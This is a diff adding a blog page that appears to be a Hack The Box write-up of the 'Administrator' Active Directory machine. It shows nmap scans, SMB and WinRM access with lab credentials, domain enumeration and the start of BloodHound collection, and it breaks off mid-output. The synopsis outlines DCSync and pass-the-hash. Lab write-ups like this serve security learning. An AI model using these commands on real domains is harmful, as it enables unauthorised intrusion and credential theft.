@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<title>HTB: Administrator | IntelliJr</title>
+
+
+
+
+
+
+<link crossorigin="anonymous" href="/assets/css/stylesheet.dfd4d67ad0f87dd2d6a0258aa5007743fae8490786540069e79c00e47886481c.css" integrity="sha256-39TWetD4fdLWoCWKpQB3Q/roSQeGVABp55wA5HiGSBw=" rel="preload stylesheet" as="style">
+
+
+<link rel="icon" href="http://localhost:1313/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/%3Clink%20/%20abs%20url%3E">
+<link rel="apple-touch-icon" href="http://localhost:1313/%3Clink%20/%20abs%20url%3E">
+<link rel="mask-icon" href="http://localhost:1313/%3Clink%20/%20abs%20url%3E">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/administrator/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+
+    <link rel="stylesheet" href="http://localhost:1313/assets/css/stylesheet.css">
+</head>
+
+<body>
+    
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" title="">
+                <img src="http://localhost:1313/apple-touch-icon.png" alt="" aria-label="logo"
+                    height="35">IntelliJr</a>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/posts" title="">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/writeups" title="">
+                    <span>Write-ups</span>
+                </a>
+            </li>
+            <div class="logo-switches">
+            </div>
+        </ul>
+    </nav>
+</header>
+
+    <hr/>
+    <main class="main">
+        
+
+
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">
+      HTB: Administrator
+    </h1>
+    <div class="post-meta">
+
+<span title='2026-06-13 00:00:00 +0000 UTC'>June 13, 2026</span></div>
+  </header> 
+<figure class="entry-cover">
+        <img loading="eager" src="http://localhost:1313/img/administrator/administrator-avatar.png" alt="">
+        
+</figure>
+  <div class="post-content">
+    <h1 id="synopsis">Synopsis</h1>
+<p>A given credentials Active Directory scenario. We start off as a user with GenericAll rights over another user and follow a chain of 3 users, each of which has some kind of misconfiguration that allows us to advance further, ultimately reaching a user with access to the FTP server containing a locked database with user passwords. After obtaining the database password by cracking the hash, we authenticate as another user with the ability to jump to the final user that has the permissions to perform a DCSync attack and obtain the Administrator&rsquo;s hash, allowing us to perform Pass-the-Hash for a complete domain takeover.</p>
+<h1 id="enumeration">Enumeration</h1>
+<p>We start this machine with given credentials: <code>olivia:ichliebedich</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nmap 10.129.20.250 -Pn --min-rate <span class="m">10000</span> -p- -oA scans/scan1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">47452</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, <span class="m">18057</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE
+</span></span><span class="line"><span class="cl">21/tcp    open  ftp
+</span></span><span class="line"><span class="cl">53/tcp    open  domain
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5
+</span></span><span class="line"><span class="cl">593/tcp   open  http-rpc-epmap
+</span></span><span class="line"><span class="cl">636/tcp   open  ldapssl
+</span></span><span class="line"><span class="cl">3268/tcp  open  globalcatLDAP
+</span></span><span class="line"><span class="cl">3269/tcp  open  globalcatLDAPssl
+</span></span><span class="line"><span class="cl">5985/tcp  open  wsman
+</span></span><span class="line"><span class="cl">9389/tcp  open  adws
+</span></span><span class="line"><span class="cl">47001/tcp open  winrm
+</span></span><span class="line"><span class="cl">49664/tcp open  unknown
+</span></span><span class="line"><span class="cl">49665/tcp open  unknown
+</span></span><span class="line"><span class="cl">49666/tcp open  unknown
+</span></span><span class="line"><span class="cl">49667/tcp open  unknown
+</span></span><span class="line"><span class="cl">49668/tcp open  unknown
+</span></span><span class="line"><span class="cl">50298/tcp open  unknown
+</span></span><span class="line"><span class="cl">50303/tcp open  unknown
+</span></span><span class="line"><span class="cl">50310/tcp open  unknown
+</span></span><span class="line"><span class="cl">50323/tcp open  unknown
+</span></span><span class="line"><span class="cl">50355/tcp open  unknown
+</span></span><span class="line"><span class="cl">56477/tcp open  unknown
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nmap 10.129.20.250 -Pn -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 -sCV -oA scans/scan2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">21/tcp    open  ftp           Microsoft ftpd
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-syst: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  SYST: Windows_NT
+</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2026-06-13 14:32:46Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: administrator.htb, Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  tcpwrapped
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: administrator.htb, Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  tcpwrapped
+</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span class="line"><span class="cl">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 7h00m00s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2026-06-13T14:33:04
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   3.1.1: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
+</span></span></code></pre></div><p>FTP login doesn&rsquo;t work for both the <code>olivia</code> and <code>anonymous</code> users.</p>
+<p>SMB null session works, but share enumeration is not allowed.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">crackmapexec smb 10.129.20.250 -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:administrator.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> administrator.htb<span class="se">\:</span> 
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> Error enumerating shares: STATUS_ACCESS_DENIED
+</span></span></code></pre></div><p>SMB authentication as <code>olivia</code> works, and share enumeration is allowed:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">crackmapexec smb 10.129.20.250 -u <span class="s1">&#39;olivia&#39;</span> -p <span class="s1">&#39;ichliebedich&#39;</span> --shares
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:administrator.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> administrator.htb<span class="se">\O</span>livia:ichliebedich 
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> Enumerated shares
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               Share           Permissions     Remark
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               -----           -----------     ------
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               ADMIN$                          Remote Admin
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               C$                              Default share
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               IPC$            READ            Remote IPC
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               NETLOGON        READ            Logon server share 
+</span></span><span class="line"><span class="cl">SMB         10.129.20.250   <span class="m">445</span>    DC               SYSVOL          READ            Logon server share
+</span></span></code></pre></div><p>LDAP authentication attempt with <code>olivia</code>&rsquo;s password results in an invalid credentials error:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ldapsearch -H ldap://administrator.htb -D ldap@administrator.htb -w <span class="s1">&#39;ichliebedich&#39;</span> -b <span class="s1">&#39;dc=administrator,dc=htb&#39;</span> <span class="s1">&#39;*&#39;</span>
+</span></span><span class="line"><span class="cl">ldap_bind: Invalid credentials <span class="o">(</span>49<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        additional info: 80090308: LdapErr: DSID-0C09050E, comment: AcceptSecurityContext error, data 52e, v4f7c
+</span></span></code></pre></div><h1 id="user">User</h1>
+<p>Let&rsquo;s log in as Olivia via WinRM:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">evil-winrm -i 10.129.20.250 -u <span class="s1">&#39;Olivia&#39;</span> -p <span class="s1">&#39;ichliebedich&#39;</span>
+</span></span></code></pre></div><p>Running some enumeration commands via WinRM:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">olivia</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">get-addomain</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">AllowedDNSSuffixes</span>                 <span class="err">:</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="n">ChildDomains</span>                       <span class="err">:</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="n">ComputersContainer</span>                 <span class="err">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">Computers</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">administrator</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">DeletedObjectsContainer</span>            <span class="err">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">Deleted</span> <span class="n">Objects</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">administrator</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">DistinguishedName</span>                  <span class="err">:</span> <span class="n">DC</span><span class="p">=</span><span class="n">administrator</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">DNSRoot</span>                            <span class="err">:</span> <span class="n">administrator</span><span class="p">.</span><span class="py">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">DomainControllersContainer</span>         <span class="err">:</span> <span class="n">OU</span><span class="p">=</span><span class="n">Domain</span> <span class="n">Controllers</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">administrator</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">DomainMode</span>                         <span class="err">:</span> <span class="n">Windows2016Domain</span>
+</span></span><span class="line"><span class="cl"><span class="n">DomainSID</span>                          <span class="err">:</span> <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">1088858960</span><span class="p">-</span><span class="mf">373806567</span><span class="p">-</span><span class="mf">254189436</span>
+</span></span><span class="line"><span class="cl"><span class="n">ForeignSecurityPrincipalsContainer</span> <span class="err">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">ForeignSecurityPrincipals</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">administrator</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">Forest</span>                             <span class="err">:</span> <span class="n">administrator</span><span class="p">.</span><span class="py">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">InfrastructureMaster</span>               <span class="err">:</span> <span class="n">dc</span><span class="p">.</span><span class="py">administrator</span><span class="p">.</span><span class="py">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">LastLogonReplicationInterval</span>       <span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">LinkedGroupPolicyObjects</span>           <span class="err">:</span> <span class="p">{</span><span class="n">CN</span><span class="p">={</span><span class="n">31B2F340</span><span class="p">-</span><span class="mf">016D</span><span class="p">-</span><span class="n">11D2</span><span class="p">-</span><span class="mf">945F</span><span class="p">-</span><span class="n">00C04FB984F9</span><span class="p">},</span><span class="n">CN</span><span class="p">=</span><span class="n">Policies</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">System</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">administrator</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">LostAndFoundContainer</span>              <span class="err">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">LostAndFound</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">administrator</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">ManagedBy</span>                          <span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">Name</span>                               <span class="err">:</span> <span class="n">administrator</span>
+</span></span><span class="line"><span class="cl"><span class="n">NetBIOSName</span>                        <span class="err">:</span> <span class="n">ADMINISTRATOR</span>
+</span></span><span class="line"><span class="cl"><span class="n">ObjectClass</span>                        <span class="err">:</span> <span class="n">domainDNS</span>
+</span></span><span class="line"><span class="cl"><span class="n">ObjectGUID</span>                         <span class="err">:</span> <span class="n">79b47a22</span><span class="p">-</span><span class="mf">3743</span><span class="p">-</span><span class="n">4ad3</span><span class="p">-</span><span class="mf">9e13</span><span class="p">-</span><span class="n">13b6432ae1bb</span>
+</span></span><span class="line"><span class="cl"><span class="n">ParentDomain</span>                       <span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">PDCEmulator</span>                        <span class="err">:</span> <span class="n">dc</span><span class="p">.</span><span class="py">administrator</span><span class="p">.</span><span class="py">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">PublicKeyRequiredPasswordRolling</span>   <span class="err">:</span> <span class="n">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">QuotasContainer</span>                    <span class="err">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">NTDS</span> <span class="n">Quotas</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">administrator</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">ReadOnlyReplicaDirectoryServers</span>    <span class="err">:</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="n">ReplicaDirectoryServers</span>            <span class="err">:</span> <span class="p">{</span><span class="n">dc</span><span class="p">.</span><span class="py">administrator</span><span class="p">.</span><span class="n">htb</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">RIDMaster</span>                          <span class="err">:</span> <span class="n">dc</span><span class="p">.</span><span class="py">administrator</span><span class="p">.</span><span class="py">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">SubordinateReferences</span>              <span class="err">:</span> <span class="p">{</span><span class="n">DC</span><span class="p">=</span><span class="n">ForestDnsZones</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">administrator</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span><span class="p">,</span> <span class="n">DC</span><span class="p">=</span><span class="n">DomainDnsZones</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">administrator</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span><span class="p">,</span> <span class="n">CN</span><span class="p">=</span><span class="n">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">administrator</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">SystemsContainer</span>                   <span class="err">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">System</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">administrator</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">UsersContainer</span>                     <span class="err">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">administrator</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">olivia</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">PRIVILEGES</span> <span class="n">INFORMATION</span>
+</span></span><span class="line"><span class="cl"><span class="p">----------------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Privilege</span> <span class="n">Name</span>                <span class="n">Description</span>                    <span class="n">State</span>
+</span></span><span class="line"><span class="cl"><span class="p">=============================</span> <span class="p">==============================</span> <span class="p">=======</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeMachineAccountPrivilege</span>     <span class="n">Add</span> <span class="n">workstations</span> <span class="n">to</span> <span class="n">domain</span>     <span class="n">Enabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeChangeNotifyPrivilege</span>       <span class="n">Bypass</span> <span class="n">traverse</span> <span class="n">checking</span>       <span class="n">Enabled</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeIncreaseWorkingSetPrivilege</span> <span class="n">Increase</span> <span class="n">a</span> <span class="k">process</span> <span class="n">working</span> <span class="nb">set </span><span class="n">Enabled</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">olivia</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">GROUP </span><span class="n">INFORMATION</span>
+</span></span><span class="line"><span class="cl"><span class="p">-----------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Group </span><span class="n">Name</span>                                  <span class="nb">Type </span>            <span class="n">SID</span>          <span class="n">Attributes</span>
+</span></span><span class="line"><span class="cl"><span class="p">===========================================</span> <span class="p">================</span> <span class="p">============</span> <span class="p">==================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">Everyone</span>                                    <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">0</span>      <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Remote</span> <span class="n">Management</span> <span class="n">Users</span>             <span class="nb">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">32</span><span class="p">-</span><span class="mf">580</span> <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span>                               <span class="nb">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">32</span><span class="p">-</span><span class="mf">545</span> <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">BUILTIN</span><span class="p">\</span><span class="nb">Pre-Windows</span> <span class="mf">2000</span> <span class="n">Compatible</span> <span class="n">Access</span>  <span class="nb">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">32</span><span class="p">-</span><span class="mf">554</span> <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">NETWORK</span>                        <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">2</span>      <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">Users</span>            <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">11</span>     <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">This</span> <span class="n">Organization</span>              <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">15</span>     <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">NTLM</span> <span class="n">Authentication</span>            <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">64</span><span class="p">-</span><span class="mf">10</span>  <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="na">Mandatory</span> <span class="n">Label</span><span class="p">\</span><span class="n">Medium</span> <span class="n">Plus</span> <span class="na">Mandatory</span> <span class="n">Level</span> <span class="n">Label</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">16</span><span class="p">-</span><span class="mf">8448</span>
+</span></span></code></pre></div><p>Nothing too crazy there, so let&rsquo;s run BloodHound.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo bloodhound-python -u <span class="s1">&#39;olivia&#39;</span> -p <span class="s1">&#39;ichliebedich&#39;</span> -ns 10.129.20.250 -d administrator.htb -c all --zip
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">INFO: BloodHound.py <span class="k">for</span> BloodHound LEGACY <span class="o">(</span>BloodHound 4.2 and 4.3<span class="o">)</span>
+</span></span><span class="line"><span class="cl">INFO: Found AD domain: administrator.htb
+</span></span><span class="line"><span class="cl">INFO: Getting TGT <span class="k">for</span> user
